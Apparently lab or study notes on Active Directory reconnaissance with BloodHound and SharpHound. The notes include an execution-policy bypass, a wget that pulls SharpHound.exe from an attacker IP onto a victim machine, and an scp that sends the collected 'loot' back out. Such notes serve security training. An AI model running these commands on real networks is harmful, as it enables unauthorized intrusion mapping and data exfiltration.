Enumeration with Bloodhound  
Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.
 
Installing bloodhound:  
1.) apt-get install bloodhound  
2.) neo4j console - default credentials -> neo4j:neo4j
 
To get sharphound.exe on target machine, use powershell to wget from local python server:  
wget http://10.2.29.79:8888/SharpHound.exe -Outfile SharpHound.exe
 
Getting loot w/ SharpHound -  
1.) powershell -ep bypass (same as with PowerView)  
2.) . .\Downloads\SharpHound.exe (don't use .ps1, it is outdated)  
3.) Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip  
4.) Transfer the loot.zip folder to your Attacker Machine  
note: you can use scp to transfer the file if you’re using ssh (scp FILE kali@10.2.29.79:/tmp/)  
(might have to turn on ssh: sudo service ssh start)
 
Mapping the network w/ BloodHound -  
1.) bloodhound Run this on your attacker machine not the victim machine  
2.) Sign In using the same credentials you set with Neo4j  
3.) Inside of Bloodhound search for this icon and import the loot.zip folder  
note: On some versions of BloodHound the import button does not work to get around this simply drag and drop the loot.zip folder into Bloodhound to import the .json files  
4.) To view the graphed network open the menu and select queries this will give you a list of pre-compiled queries to choose from.
 
The queries can be as simple as find all domain admins -  
Or as complicated as shortest path to high value targets -
 
(if you cant access the default database (bolt://localhost:7687) then in shell:  
neo4j console (to see which interface its running, prob localhost:7474)  
login to that address on web  
connect to the database  
return to blood hound GUI: DB=bolt://localhost:7687)
 
*Also ensure you have neo4j console running in shell,  
and are connected in the browser to localhost:7474  
before dragging the .zip file into bloodhound GUI.